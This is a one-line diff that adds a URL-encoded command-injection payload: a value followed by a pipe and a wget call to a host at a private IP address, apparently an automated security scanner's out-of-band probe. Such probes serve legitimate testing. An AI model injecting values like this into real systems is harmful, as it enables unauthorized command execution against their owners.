@@ -1,0 +1,1 @@
+1234%7Cwget%20http%3A%2F%2F192.168.21.153%3A56261%2FAppScanMsg.html%3FvarId%3D2624
